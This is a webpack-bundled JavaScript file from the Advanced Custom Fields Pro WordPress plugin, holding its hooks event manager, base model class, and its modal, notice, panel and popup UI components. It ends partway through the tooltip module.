/******/ (function() { // webpackBootstrap
/******/ 	var __webpack_modules__ = ({

/***/ "./src/advanced-custom-fields-pro/assets/src/js/_acf-hooks.js":
/*!********************************************************************!*\
  !*** ./src/advanced-custom-fields-pro/assets/src/js/_acf-hooks.js ***!
  \********************************************************************/
/***/ (function() {

(function (window, undefined) {
  'use strict';

  /**
   * Handles managing all events for whatever you plug it into. Priorities for hooks are based on lowest to highest in
   * that, lowest priority hooks are fired first.
   */
  var EventManager = function () {
    /**
     * Maintain a reference to the object scope so our public methods never get confusing.
     */
    var MethodsAvailable = {
      removeFilter: removeFilter,
      applyFilters: applyFilters,
      addFilter: addFilter,
      removeAction: removeAction,
      doAction: doAction,
      addAction: addAction,
      storage: getStorage
    };

    /**
     * Contains the hooks that get registered with this EventManager. The array for storage utilizes a "flat"
     * object literal such that looking up the hook utilizes the native object literal hash.
     */
    var STORAGE = {
      actions: {},
      filters: {}
    };
    function getStorage() {
      return STORAGE;
    }

    /**
     * Adds an action to the event manager.
     *
     * @param action Must contain namespace.identifier
     * @param callback Must be a valid callback function before this action is added
     * @param [priority=10] Used to control when the function is executed in relation to other callbacks bound to the same hook
     * @param [context] Supply a value to be used for this
     */
    function addAction(action, callback, priority, context) {
      if (typeof action === 'string' && typeof callback === 'function') {
        priority = parseInt(priority || 10, 10);
        _addHook('actions', action, callback, priority, context);
      }
      return MethodsAvailable;
    }

    /**
     * Performs an action if it exists. You can pass as many arguments as you want to this function; the only rule is
     * that the first argument must always be the action.
     */
    function doAction( /* action, arg1, arg2, ... */
    ) {
      var args = Array.prototype.slice.call(arguments);
      var action = args.shift();
      if (typeof action === 'string') {
        _runHook('actions', action, args);
      }
      return MethodsAvailable;
    }

    /**
     * Removes the specified action if it contains a namespace.identifier & exists.
     *
     * @param action The action to remove
     * @param [callback] Callback function to remove
     */
    function removeAction(action, callback) {
      if (typeof action === 'string') {
        _removeHook('actions', action, callback);
      }
      return MethodsAvailable;
    }

    /**
     * Adds a filter to the event manager.
     *
     * @param filter Must contain namespace.identifier
     * @param callback Must be a valid callback function before this action is added
     * @param [priority=10] Used to control when the function is executed in relation to other callbacks bound to the same hook
     * @param [context] Supply a value to be used for this
     */
    function addFilter(filter, callback, priority, context) {
      if (typeof filter === 'string' && typeof callback === 'function') {
        priority = parseInt(priority || 10, 10);
        _addHook('filters', filter, callback, priority, context);
      }
      return MethodsAvailable;
    }

    /**
     * Performs a filter if it exists. You should only ever pass 1 argument to be filtered. The only rule is that
     * the first argument must always be the filter.
     */
    function applyFilters( /* filter, filtered arg, arg2, ... */
    ) {
      var args = Array.prototype.slice.call(arguments);
      var filter = args.shift();
      if (typeof filter === 'string') {
        return _runHook('filters', filter, args);
      }
      return MethodsAvailable;
    }

    /**
     * Removes the specified filter if it contains a namespace.identifier & exists.
     *
     * @param filter The action to remove
     * @param [callback] Callback function to remove
     */
    function removeFilter(filter, callback) {
      if (typeof filter === 'string') {
        _removeHook('filters', filter, callback);
      }
      return MethodsAvailable;
    }

    /**
     * Removes the specified hook by resetting the value of it.
     *
     * @param type Type of hook, either 'actions' or 'filters'
     * @param hook The hook (namespace.identifier) to remove
     * @private
     */
    function _removeHook(type, hook, callback, context) {
      if (!STORAGE[type][hook]) {
        return;
      }
      if (!callback) {
        STORAGE[type][hook] = [];
      } else {
        var handlers = STORAGE[type][hook];
        var i;
        if (!context) {
          for (i = handlers.length; i--;) {
            if (handlers[i].callback === callback) {
              handlers.splice(i, 1);
            }
          }
        } else {
          for (i = handlers.length; i--;) {
            var handler = handlers[i];
            if (handler.callback === callback && handler.context === context) {
              handlers.splice(i, 1);
            }
          }
        }
      }
    }

    /**
     * Adds the hook to the appropriate storage container
     *
     * @param type 'actions' or 'filters'
     * @param hook The hook (namespace.identifier) to add to our event manager
     * @param callback The function that will be called when the hook is executed.
     * @param priority The priority of this hook. Must be an integer.
     * @param [context] A value to be used for this
     * @private
     */
    function _addHook(type, hook, callback, priority, context) {
      var hookObject = {
        callback: callback,
        priority: priority,
        context: context
      };

      // Utilize 'prop itself' : http://jsperf.com/hasownproperty-vs-in-vs-undefined/19
      var hooks = STORAGE[type][hook];
      if (hooks) {
        hooks.push(hookObject);
        hooks = _hookInsertSort(hooks);
      } else {
        hooks = [hookObject];
      }
      STORAGE[type][hook] = hooks;
    }

    /**
     * Use an insert sort for keeping our hooks organized based on priority. This function is ridiculously faster
     * than bubble sort, etc: http://jsperf.com/javascript-sort
     *
     * @param hooks The custom array containing all of the appropriate hooks to perform an insert sort on.
     * @private
     */
    function _hookInsertSort(hooks) {
      var tmpHook, j, prevHook;
      for (var i = 1, len = hooks.length; i < len; i++) {
        tmpHook = hooks[i];
        j = i;
        while ((prevHook = hooks[j - 1]) && prevHook.priority > tmpHook.priority) {
          hooks[j] = hooks[j - 1];
          --j;
        }
        hooks[j] = tmpHook;
      }
      return hooks;
    }

    /**
     * Runs the specified hook. If it is an action, the value is not modified but if it is a filter, it is.
     *
     * @param type 'actions' or 'filters'
     * @param hook The hook ( namespace.identifier ) to be ran.
     * @param args Arguments to pass to the action/filter. If it's a filter, args is actually a single parameter.
     * @private
     */
    function _runHook(type, hook, args) {
      var handlers = STORAGE[type][hook];
      if (!handlers) {
        return type === 'filters' ? args[0] : false;
      }
      var i = 0,
        len = handlers.length;
      if (type === 'filters') {
        for (; i < len; i++) {
          args[0] = handlers[i].callback.apply(handlers[i].context, args);
        }
      } else {
        for (; i < len; i++) {
          handlers[i].callback.apply(handlers[i].context, args);
        }
      }
      return type === 'filters' ? args[0] : true;
    }

    // return all of the publicly available methods
    return MethodsAvailable;
  };

  // instantiate
  acf.hooks = new EventManager();
})(window);

/***/ }),

/***/ "./src/advanced-custom-fields-pro/assets/src/js/_acf-modal.js":
/*!********************************************************************!*\
  !*** ./src/advanced-custom-fields-pro/assets/src/js/_acf-modal.js ***!
  \********************************************************************/
/***/ (function() {

(function ($, undefined) {
  acf.models.Modal = acf.Model.extend({
    data: {
      title: '',
      content: '',
      toolbar: ''
    },
    events: {
      'click .acf-modal-close': 'onClickClose'
    },
    setup: function (props) {
      $.extend(this.data, props);
      this.$el = $();
      this.render();
    },
    initialize: function () {
      this.open();
    },
    render: function () {
      // Extract vars.
      var title = this.get('title');
      var content = this.get('content');
      var toolbar = this.get('toolbar');

      // Create element.
      var $el = $(['<div>', '<div class="acf-modal">', '<div class="acf-modal-title">', '<h2>' + title + '</h2>', '<button class="acf-modal-close" type="button"><span class="dashicons dashicons-no"></span></button>', '</div>', '<div class="acf-modal-content">' + content + '</div>', '<div class="acf-modal-toolbar">' + toolbar + '</div>', '</div>', '<div class="acf-modal-backdrop acf-modal-close"></div>', '</div>'].join(''));

      // Update DOM.
      if (this.$el) {
        this.$el.replaceWith($el);
      }
      this.$el = $el;

      // Trigger action.
      acf.doAction('append', $el);
    },
    update: function (props) {
      this.data = acf.parseArgs(props, this.data);
      this.render();
    },
    title: function (title) {
      this.$('.acf-modal-title h2').html(title);
    },
    content: function (content) {
      this.$('.acf-modal-content').html(content);
    },
    toolbar: function (toolbar) {
      this.$('.acf-modal-toolbar').html(toolbar);
    },
    open: function () {
      $('body').append(this.$el);
    },
    close: function () {
      this.remove();
    },
    onClickClose: function (e, $el) {
      e.preventDefault();
      this.close();
    },
    /**
     * Places focus within the popup.
     */
    focus: function () {
      this.$el.find('.acf-icon').first().trigger('focus');
    },
    /**
     * Locks focus within the modal.
     *
     * @param {boolean} locked True to lock focus, false to unlock.
     */
    lockFocusToModal: function (locked) {
      let inertElement = $('#wpwrap');
      if (!inertElement.length) {
        return;
      }
      inertElement[0].inert = locked;
      inertElement.attr('aria-hidden', locked);
    },
    /**
     * Returns focus to the element that opened the popup
     * if it still exists in the DOM.
     */
    returnFocusToOrigin: function () {
      if (this.data.openedBy instanceof $ && this.data.openedBy.closest('body').length > 0) {
        this.data.openedBy.trigger('focus');
      }
    }
  });

  /**
   * Returns a new modal.
   *
   * @date	21/4/20
   * @since	5.9.0
   *
   * @param	object props The modal props.
   * @return	object
   */
  acf.newModal = function (props) {
    return new acf.models.Modal(props);
  };
})(jQuery);

/***/ }),

/***/ "./src/advanced-custom-fields-pro/assets/src/js/_acf-model.js":
/*!********************************************************************!*\
  !*** ./src/advanced-custom-fields-pro/assets/src/js/_acf-model.js ***!
  \********************************************************************/
/***/ (function() {

(function ($, undefined) {
  // Cached regex to split keys for `addEvent`.
  var delegateEventSplitter = /^(\S+)\s*(.*)$/;

  /**
   *  extend
   *
   *  Helper function to correctly set up the prototype chain for subclasses
   *  Heavily inspired by backbone.js
   *
   *  @date	14/12/17
   *  @since	5.6.5
   *
   *  @param	object protoProps New properties for this object.
   *  @return	function.
   */

  var extend = function (protoProps) {
    // vars
    var Parent = this;
    var Child;

    // The constructor function for the new subclass is either defined by you
    // (the "constructor" property in your `extend` definition), or defaulted
    // by us to simply call the parent constructor.
    if (protoProps && protoProps.hasOwnProperty('constructor')) {
      Child = protoProps.constructor;
    } else {
      Child = function () {
        return Parent.apply(this, arguments);
      };
    }

    // Add static properties to the constructor function, if supplied.
    $.extend(Child, Parent);

    // Set the prototype chain to inherit from `parent`, without calling
    // `parent`'s constructor function and add the prototype properties.
    Child.prototype = Object.create(Parent.prototype);
    $.extend(Child.prototype, protoProps);
    Child.prototype.constructor = Child;

    // Set a convenience property in case the parent's prototype is needed later.
    //Child.prototype.__parent__ = Parent.prototype;

    // return
    return Child;
  };

  /**
   *  Model
   *
   *  Base class for all inheritence
   *
   *  @date	14/12/17
   *  @since	5.6.5
   *
   *  @param	object props
   *  @return	function.
   */

  var Model = acf.Model = function () {
    // generate uique client id
    this.cid = acf.uniqueId('acf');

    // set vars to avoid modifying prototype
    this.data = $.extend(true, {}, this.data);

    // pass props to setup function
    this.setup.apply(this, arguments);

    // store on element (allow this.setup to create this.$el)
    if (this.$el && !this.$el.data('acf')) {
      this.$el.data('acf', this);
    }

    // initialize
    var initialize = function () {
      this.initialize();
      this.addEvents();
      this.addActions();
      this.addFilters();
    };

    // initialize on action
    if (this.wait && !acf.didAction(this.wait)) {
      this.addAction(this.wait, initialize);

      // initialize now
    } else {
      initialize.apply(this);
    }
  };

  // Attach all inheritable methods to the Model prototype.
  $.extend(Model.prototype, {
    // Unique model id
    id: '',
    // Unique client id
    cid: '',
    // jQuery element
    $el: null,
    // Data specific to this instance
    data: {},
    // toggle used when changing data
    busy: false,
    changed: false,
    // Setup events hooks
    events: {},
    actions: {},
    filters: {},
    // class used to avoid nested event triggers
    eventScope: '',
    // action to wait until initialize
    wait: false,
    // action priority default
    priority: 10,
    /**
     *  get
     *
     *  Gets a specific data value
     *
     *  @date	14/12/17
     *  @since	5.6.5
     *
     *  @param	string name
     *  @return	mixed
     */

    get: function (name) {
      return this.data[name];
    },
    /**
     *  has
     *
     *  Returns `true` if the data exists and is not null
     *
     *  @date	14/12/17
     *  @since	5.6.5
     *
     *  @param	string name
     *  @return	boolean
     */

    has: function (name) {
      return this.get(name) != null;
    },
    /**
     *  set
     *
     *  Sets a specific data value
     *
     *  @date	14/12/17
     *  @since	5.6.5
     *
     *  @param	string name
     *  @param	mixed value
     *  @return	this
     */

    set: function (name, value, silent) {
      // bail if unchanged
      var prevValue = this.get(name);
      if (prevValue == value) {
        return this;
      }

      // set data
      this.data[name] = value;

      // trigger events
      if (!silent) {
        this.changed = true;
        this.trigger('changed:' + name, [value, prevValue]);
        this.trigger('changed', [name, value, prevValue]);
      }

      // return
      return this;
    },
    /**
     *  inherit
     *
     *  Inherits the data from a jQuery element
     *
     *  @date	14/12/17
     *  @since	5.6.5
     *
     *  @param	jQuery $el
     *  @return	this
     */

    inherit: function (data) {
      // allow jQuery
      if (data instanceof jQuery) {
        data = data.data();
      }

      // extend
      $.extend(this.data, data);

      // return
      return this;
    },
    /**
     *  prop
     *
     *  mimics the jQuery prop function
     *
     *  @date	4/6/18
     *  @since	5.6.9
     *
     *  @param	type $var Description. Default.
     *  @return	type Description.
     */

    prop: function () {
      return this.$el.prop.apply(this.$el, arguments);
    },
    /**
     *  setup
     *
     *  Run during constructor function
     *
     *  @date	14/12/17
     *  @since	5.6.5
     *
     *  @param	n/a
     *  @return	n/a
     */

    setup: function (props) {
      $.extend(this, props);
    },
    /**
     *  initialize
     *
     *  Also run during constructor function
     *
     *  @date	14/12/17
     *  @since	5.6.5
     *
     *  @param	n/a
     *  @return	n/a
     */

    initialize: function () {},
    /**
     *  addElements
     *
     *  Adds multiple jQuery elements to this object
     *
     *  @date	9/5/18
     *  @since	5.6.9
     *
     *  @param	type $var Description. Default.
     *  @return	type Description.
     */

    addElements: function (elements) {
      elements = elements || this.elements || null;
      if (!elements || !Object.keys(elements).length) return false;
      for (var i in elements) {
        this.addElement(i, elements[i]);
      }
    },
    /**
     *  addElement
     *
     *  description
     *
     *  @date	9/5/18
     *  @since	5.6.9
     *
     *  @param	type $var Description. Default.
     *  @return	type Description.
     */

    addElement: function (name, selector) {
      this['$' + name] = this.$(selector);
    },
    /**
     *  addEvents
     *
     *  Adds multiple event handlers
     *
     *  @date	14/12/17
     *  @since	5.6.5
     *
     *  @param	object events {event1 : callback, event2 : callback, etc }
     *  @return	n/a
     */

    addEvents: function (events) {
      events = events || this.events || null;
      if (!events) return false;
      for (var key in events) {
        var match = key.match(delegateEventSplitter);
        this.on(match[1], match[2], events[key]);
      }
    },
    /**
     *  removeEvents
     *
     *  Removes multiple event handlers
     *
     *  @date	14/12/17
     *  @since	5.6.5
     *
     *  @param	object events {event1 : callback, event2 : callback, etc }
     *  @return	n/a
     */

    removeEvents: function (events) {
      events = events || this.events || null;
      if (!events) return false;
      for (var key in events) {
        var match = key.match(delegateEventSplitter);
        this.off(match[1], match[2], events[key]);
      }
    },
    /**
     *  getEventTarget
     *
     *  Returns a jQuery element to trigger an event on.
     *
     *  @date	5/6/18
     *  @since	5.6.9
     *
     *  @param	jQuery $el		The default jQuery element. Optional.
     *  @param	string event	The event name. Optional.
     *  @return	jQuery
     */

    getEventTarget: function ($el, event) {
      return $el || this.$el || $(document);
    },
    /**
     *  validateEvent
     *
     *  Returns true if the event target's closest $el is the same as this.$el
     *  Requires both this.el and this.$el to be defined
     *
     *  @date	5/6/18
     *  @since	5.6.9
     *
     *  @param	type $var Description. Default.
     *  @return	type Description.
     */

    validateEvent: function (e) {
      if (this.eventScope) {
        return $(e.target).closest(this.eventScope).is(this.$el);
      } else {
        return true;
      }
    },
    /**
     *  proxyEvent
     *
     *  Returns a new event callback function scoped to this model
     *
     *  @date	29/3/18
     *  @since	5.6.9
     *
     *  @param	function callback
     *  @return	function
     */

    proxyEvent: function (callback) {
      return this.proxy(function (e) {
        // validate
        if (!this.validateEvent(e)) {
          return;
        }

        // construct args
        var args = acf.arrayArgs(arguments);
        var extraArgs = args.slice(1);
        var eventArgs = [e, $(e.currentTarget)].concat(extraArgs);

        // callback
        callback.apply(this, eventArgs);
      });
    },
    /**
     *  on
     *
     *  Adds an event handler similar to jQuery
     *  Uses the instance 'cid' to namespace event
     *
     *  @date	14/12/17
     *  @since	5.6.5
     *
     *  @param	string name
     *  @param	string callback
     *  @return	n/a
     */

    on: function (a1, a2, a3, a4) {
      // vars
      var $el, event, selector, callback, args;

      // find args
      if (a1 instanceof jQuery) {
        // 1. args( $el, event, selector, callback )
        if (a4) {
          $el = a1;
          event = a2;
          selector = a3;
          callback = a4;

          // 2. args( $el, event, callback )
        } else {
          $el = a1;
          event = a2;
          callback = a3;
        }
      } else {
        // 3. args( event, selector, callback )
        if (a3) {
          event = a1;
          selector = a2;
          callback = a3;

          // 4. args( event, callback )
        } else {
          event = a1;
          callback = a2;
        }
      }

      // element
      $el = this.getEventTarget($el);

      // modify callback
      if (typeof callback === 'string') {
        callback = this.proxyEvent(this[callback]);
      }

      // modify event
      event = event + '.' + this.cid;

      // args
      if (selector) {
        args = [event, selector, callback];
      } else {
        args = [event, callback];
      }

      // on()
      $el.on.apply($el, args);
    },
    /**
     *  off
     *
     *  Removes an event handler similar to jQuery
     *
     *  @date	14/12/17
     *  @since	5.6.5
     *
     *  @param	string name
     *  @param	string callback
     *  @return	n/a
     */

    off: function (a1, a2, a3) {
      // vars
      var $el, event, selector, args;

      // find args
      if (a1 instanceof jQuery) {
        // 1. args( $el, event, selector )
        if (a3) {
          $el = a1;
          event = a2;
          selector = a3;

          // 2. args( $el, event )
        } else {
          $el = a1;
          event = a2;
        }
      } else {
        // 3. args( event, selector )
        if (a2) {
          event = a1;
          selector = a2;

          // 4. args( event )
        } else {
          event = a1;
        }
      }

      // element
      $el = this.getEventTarget($el);

      // modify event
      event = event + '.' + this.cid;

      // args
      if (selector) {
        args = [event, selector];
      } else {
        args = [event];
      }

      // off()
      $el.off.apply($el, args);
    },
    /**
     *  trigger
     *
     *  Triggers an event similar to jQuery
     *
     *  @date	14/12/17
     *  @since	5.6.5
     *
     *  @param	string name
     *  @param	string callback
     *  @return	n/a
     */

    trigger: function (name, args, bubbles) {
      var $el = this.getEventTarget();
      if (bubbles) {
        $el.trigger.apply($el, arguments);
      } else {
        $el.triggerHandler.apply($el, arguments);
      }
      return this;
    },
    /**
     *  addActions
     *
     *  Adds multiple action handlers
     *
     *  @date	14/12/17
     *  @since	5.6.5
     *
     *  @param	object actions {action1 : callback, action2 : callback, etc }
     *  @return	n/a
     */

    addActions: function (actions) {
      actions = actions || this.actions || null;
      if (!actions) return false;
      for (var i in actions) {
        this.addAction(i, actions[i]);
      }
    },
    /**
     *  removeActions
     *
     *  Removes multiple action handlers
     *
     *  @date	14/12/17
     *  @since	5.6.5
     *
     *  @param	object actions {action1 : callback, action2 : callback, etc }
     *  @return	n/a
     */

    removeActions: function (actions) {
      actions = actions || this.actions || null;
      if (!actions) return false;
      for (var i in actions) {
        this.removeAction(i, actions[i]);
      }
    },
    /**
     *  addAction
     *
     *  Adds an action using the wp.hooks library
     *
     *  @date	14/12/17
     *  @since	5.6.5
     *
     *  @param	string name
     *  @param	string callback
     *  @return	n/a
     */

    addAction: function (name, callback, priority) {
      //console.log('addAction', name, priority);
      // defaults
      priority = priority || this.priority;

      // modify callback
      if (typeof callback === 'string') {
        callback = this[callback];
      }

      // add
      acf.addAction(name, callback, priority, this);
    },
    /**
     *  removeAction
     *
     *  Remove an action using the wp.hooks library
     *
     *  @date	14/12/17
     *  @since	5.6.5
     *
     *  @param	string name
     *  @param	string callback
     *  @return	n/a
     */

    removeAction: function (name, callback) {
      acf.removeAction(name, this[callback]);
    },
    /**
     *  addFilters
     *
     *  Adds multiple filter handlers
     *
     *  @date	14/12/17
     *  @since	5.6.5
     *
     *  @param	object filters {filter1 : callback, filter2 : callback, etc }
     *  @return	n/a
     */

    addFilters: function (filters) {
      filters = filters || this.filters || null;
      if (!filters) return false;
      for (var i in filters) {
        this.addFilter(i, filters[i]);
      }
    },
    /**
     *  addFilter
     *
     *  Adds a filter using the wp.hooks library
     *
     *  @date	14/12/17
     *  @since	5.6.5
     *
     *  @param	string name
     *  @param	string callback
     *  @return	n/a
     */

    addFilter: function (name, callback, priority) {
      // defaults
      priority = priority || this.priority;

      // modify callback
      if (typeof callback === 'string') {
        callback = this[callback];
      }

      // add
      acf.addFilter(name, callback, priority, this);
    },
    /**
     *  removeFilters
     *
     *  Removes multiple filter handlers
     *
     *  @date	14/12/17
     *  @since	5.6.5
     *
     *  @param	object filters {filter1 : callback, filter2 : callback, etc }
     *  @return	n/a
     */

    removeFilters: function (filters) {
      filters = filters || this.filters || null;
      if (!filters) return false;
      for (var i in filters) {
        this.removeFilter(i, filters[i]);
      }
    },
    /**
     *  removeFilter
     *
     *  Remove a filter using the wp.hooks library
     *
     *  @date	14/12/17
     *  @since	5.6.5
     *
     *  @param	string name
     *  @param	string callback
     *  @return	n/a
     */

    removeFilter: function (name, callback) {
      acf.removeFilter(name, this[callback]);
    },
    /**
     *  $
     *
     *  description
     *
     *  @date	16/12/17
     *  @since	5.6.5
     *
     *  @param	type $var Description. Default.
     *  @return	type Description.
     */

    $: function (selector) {
      return this.$el.find(selector);
    },
    /**
     *  remove
     *
     *  Removes the element and listenters
     *
     *  @date	19/12/17
     *  @since	5.6.5
     *
     *  @param	type $var Description. Default.
     *  @return	type Description.
     */

    remove: function () {
      this.removeEvents();
      this.removeActions();
      this.removeFilters();
      this.$el.remove();
    },
    /**
     *  setTimeout
     *
     *  description
     *
     *  @date	16/1/18
     *  @since	5.6.5
     *
     *  @param	type $var Description. Default.
     *  @return	type Description.
     */

    setTimeout: function (callback, milliseconds) {
      return setTimeout(this.proxy(callback), milliseconds);
    },
    /**
     *  time
     *
     *  used for debugging
     *
     *  @date	7/3/18
     *  @since	5.6.9
     *
     *  @param	type $var Description. Default.
     *  @return	type Description.
     */

    time: function () {
      console.time(this.id || this.cid);
    },
    /**
     *  timeEnd
     *
     *  used for debugging
     *
     *  @date	7/3/18
     *  @since	5.6.9
     *
     *  @param	type $var Description. Default.
     *  @return	type Description.
     */

    timeEnd: function () {
      console.timeEnd(this.id || this.cid);
    },
    /**
     *  show
     *
     *  description
     *
     *  @date	15/3/18
     *  @since	5.6.9
     *
     *  @param	type $var Description. Default.
     *  @return	type Description.
     */

    show: function () {
      acf.show(this.$el);
    },
    /**
     *  hide
     *
     *  description
     *
     *  @date	15/3/18
     *  @since	5.6.9
     *
     *  @param	type $var Description. Default.
     *  @return	type Description.
     */

    hide: function () {
      acf.hide(this.$el);
    },
    /**
     *  proxy
     *
     *  Returns a new function scoped to this model
     *
     *  @date	29/3/18
     *  @since	5.6.9
     *
     *  @param	function callback
     *  @return	function
     */

    proxy: function (callback) {
      return $.proxy(callback, this);
    }
  });

  // Set up inheritance for the model
  Model.extend = extend;

  // Global model storage
  acf.models = {};

  /**
   *  acf.getInstance
   *
   *  This function will get an instance from an element
   *
   *  @date	5/3/18
   *  @since	5.6.9
   *
   *  @param	type $var Description. Default.
   *  @return	type Description.
   */

  acf.getInstance = function ($el) {
    return $el.data('acf');
  };

  /**
   *  acf.getInstances
   *
   *  This function will get an array of instances from multiple elements
   *
   *  @date	5/3/18
   *  @since	5.6.9
   *
   *  @param	type $var Description. Default.
   *  @return	type Description.
   */

  acf.getInstances = function ($el) {
    var instances = [];
    $el.each(function () {
      instances.push(acf.getInstance($(this)));
    });
    return instances;
  };
})(jQuery);

/***/ }),

/***/ "./src/advanced-custom-fields-pro/assets/src/js/_acf-notice.js":
/*!*********************************************************************!*\
  !*** ./src/advanced-custom-fields-pro/assets/src/js/_acf-notice.js ***!
  \*********************************************************************/
/***/ (function() {

(function ($, undefined) {
  var Notice = acf.Model.extend({
    data: {
      text: '',
      type: '',
      timeout: 0,
      dismiss: true,
      target: false,
      close: function () {}
    },
    events: {
      'click .acf-notice-dismiss': 'onClickClose'
    },
    tmpl: function () {
      return '<div class="acf-notice"></div>';
    },
    setup: function (props) {
      $.extend(this.data, props);
      this.$el = $(this.tmpl());
    },
    initialize: function () {
      // render
      this.render();

      // show
      this.show();
    },
    render: function () {
      // class
      this.type(this.get('type'));

      // text
      this.html('<p>' + this.get('text') + '</p>');

      // close
      if (this.get('dismiss')) {
        this.$el.append('<a href="#" class="acf-notice-dismiss acf-icon -cancel small"></a>');
        this.$el.addClass('-dismiss');
      }

      // timeout
      var timeout = this.get('timeout');
      if (timeout) {
        this.away(timeout);
      }
    },
    update: function (props) {
      // update
      $.extend(this.data, props);

      // re-initialize
      this.initialize();

      // refresh events
      this.removeEvents();
      this.addEvents();
    },
    show: function () {
      var $target = this.get('target');
      if ($target) {
        $target.prepend(this.$el);
      }
    },
    hide: function () {
      this.$el.remove();
    },
    away: function (timeout) {
      this.setTimeout(function () {
        acf.remove(this.$el);
      }, timeout);
    },
    type: function (type) {
      // remove prev type
      var prevType = this.get('type');
      if (prevType) {
        this.$el.removeClass('-' + prevType);
      }

      // add new type
      this.$el.addClass('-' + type);

      // backwards compatibility
      if (type == 'error') {
        this.$el.addClass('acf-error-message');
      }
    },
    html: function (html) {
      this.$el.html(acf.escHtml(html));
    },
    text: function (text) {
      this.$('p').html(acf.escHtml(text));
    },
    onClickClose: function (e, $el) {
      e.preventDefault();
      this.get('close').apply(this, arguments);
      this.remove();
    }
  });
  acf.newNotice = function (props) {
    // ensure object
    if (typeof props !== 'object') {
      props = {
        text: props
      };
    }

    // instantiate
    return new Notice(props);
  };
  var noticeManager = new acf.Model({
    wait: 'prepare',
    priority: 1,
    initialize: function () {
      const $notices = $('.acf-admin-notice');
      $notices.each(function () {
        // Move to avoid WP flicker.
        if ($(this).length) {
          $('h1:first').after($(this));
        }
        if ($(this).data('persisted')) {
          let dismissed = acf.getPreference('dismissed-notices');
          if (dismissed && typeof dismissed == 'object' && dismissed.includes($(this).data('persist-id'))) {
            $(this).remove();
          } else {
            $(this).show();
            $(this).on('click', '.notice-dismiss', function (e) {
              dismissed = acf.getPreference('dismissed-notices');
              if (!dismissed || typeof dismissed != 'object') {
                dismissed = [];
              }
              dismissed.push($(this).closest('.acf-admin-notice').data('persist-id'));
              acf.setPreference('dismissed-notices', dismissed);
            });
          }
        }
      });
    }
  });
})(jQuery);

/***/ }),

/***/ "./src/advanced-custom-fields-pro/assets/src/js/_acf-panel.js":
/*!********************************************************************!*\
  !*** ./src/advanced-custom-fields-pro/assets/src/js/_acf-panel.js ***!
  \********************************************************************/
/***/ (function() {

(function ($, undefined) {
  var panel = new acf.Model({
    events: {
      'click .acf-panel-title': 'onClick'
    },
    onClick: function (e, $el) {
      e.preventDefault();
      this.toggle($el.parent());
    },
    isOpen: function ($el) {
      return $el.hasClass('-open');
    },
    toggle: function ($el) {
      this.isOpen($el) ? this.close($el) : this.open($el);
    },
    open: function ($el) {
      $el.addClass('-open');
      $el.find('.acf-panel-title i').attr('class', 'dashicons dashicons-arrow-down');
    },
    close: function ($el) {
      $el.removeClass('-open');
      $el.find('.acf-panel-title i').attr('class', 'dashicons dashicons-arrow-right');
    }
  });
})(jQuery);

/***/ }),

/***/ "./src/advanced-custom-fields-pro/assets/src/js/_acf-popup.js":
/*!********************************************************************!*\
  !*** ./src/advanced-custom-fields-pro/assets/src/js/_acf-popup.js ***!
  \********************************************************************/
/***/ (function() {

(function ($, undefined) {
  acf.models.Popup = acf.Model.extend({
    data: {
      title: '',
      content: '',
      width: 0,
      height: 0,
      loading: false,
      openedBy: null
    },
    events: {
      'click [data-event="close"]': 'onClickClose',
      'click .acf-close-popup': 'onClickClose',
      'keydown': 'onPressEscapeClose'
    },
    setup: function (props) {
      $.extend(this.data, props);
      this.$el = $(this.tmpl());
    },
    initialize: function () {
      this.render();
      this.open();
      this.focus();
      this.lockFocusToPopup(true);
    },
    tmpl: function () {
      return ['<div id="acf-popup" role="dialog" tabindex="-1">', '<div class="acf-popup-box acf-box">', '<div class="title"><h3></h3><a href="#" class="acf-icon -cancel grey" data-event="close" aria-label="' + acf.__('Close modal') + '"></a></div>', '<div class="inner"></div>', '<div class="loading"><i class="acf-loading"></i></div>', '</div>', '<div class="bg" data-event="close"></div>', '</div>'].join('');
    },
    render: function () {
      // Extract Vars.
      var title = this.get('title');
      var content = this.get('content');
      var loading = this.get('loading');
      var width = this.get('width');
      var height = this.get('height');

      // Update.
      this.title(title);
      this.content(content);
      if (width) {
        this.$('.acf-popup-box').css('width', width);
      }
      if (height) {
        this.$('.acf-popup-box').css('min-height', height);
      }
      this.loading(loading);

      // Trigger action.
      acf.doAction('append', this.$el);
    },
    /**
     * Places focus within the popup.
     */
    focus: function () {
      this.$el.find('.acf-icon').first().trigger('focus');
    },
    /**
     * Locks focus within the popup.
     *
     * @param {boolean} locked True to lock focus, false to unlock.
     */
    lockFocusToPopup: function (locked) {
      let inertElement = $('#wpwrap');
      if (!inertElement.length) {
        return;
      }
      inertElement[0].inert = locked;
      inertElement.attr('aria-hidden', locked);
    },
    update: function (props) {
      this.data = acf.parseArgs(props, this.data);
      this.render();
    },
    title: function (title) {
      this.$('.title:first h3').html(title);
    },
    content: function (content) {
      this.$('.inner:first').html(content);
    },
    loading: function (show) {
      var $loading = this.$('.loading:first');
      show ? $loading.show() : $loading.hide();
    },
    open: function () {
      $('body').append(this.$el);
    },
    close: function () {
      this.lockFocusToPopup(false);
      this.returnFocusToOrigin();
      this.remove();
    },
    onClickClose: function (e, $el) {
      e.preventDefault();
      this.close();
    },
    /**
     * Closes the popup when the escape key is pressed.
     *
     * @param {KeyboardEvent} e
     */
    onPressEscapeClose: function (e) {
      if (e.key === 'Escape') {
        this.close();
      }
    },
    /**
     * Returns focus to the element that opened the popup
     * if it still exists in the DOM.
     */
    returnFocusToOrigin: function () {
      if (this.data.openedBy instanceof $ && this.data.openedBy.closest('body').length > 0) {
        this.data.openedBy.trigger('focus');
      }
    }
  });

  /**
   *  newPopup
   *
   *  Creates a new Popup with the supplied props
   *
   *  @date	17/12/17
   *  @since	5.6.5
   *
   *  @param	object props
   *  @return	object
   */

  acf.newPopup = function (props) {
    return new acf.models.Popup(props);
  };
})(jQuery);

/***/ }),

/***/ "./src/advanced-custom-fields-pro/assets/src/js/_acf-tooltip.js":
/*!**********************************************************************!*\
  !*** ./src/advanced-custom-fields-pro/assets/src/js/_acf-tooltip.js ***!
  \**********************************************************************/
/***/ (function() {

(function ($, undefined) {
  acf.newTooltip = function (props) {
    // ensure object
    if (typeof props !== 'object') {
      props = {
        text: props
      };
    }

    // confirmRemove
    if (props.confirmRemove !== undefined) {
      props.textConfirm = acf.__('Remove');
      props.textCancel = acf.__('Cancel');
      return new TooltipConfirm(props);

      // confirm
    } else if (props.confirm !== undefined) {
      return new TooltipConfirm(props);

      // default
    } else {
      return new Tooltip(props);
    }
  };
  var Tooltip = acf.Model.extend({
    data: {
      text: '',
      timeout: 0,
      target: null
    },
    tmpl: function () {
      return '<div class="acf-tooltip"></div>';
    },
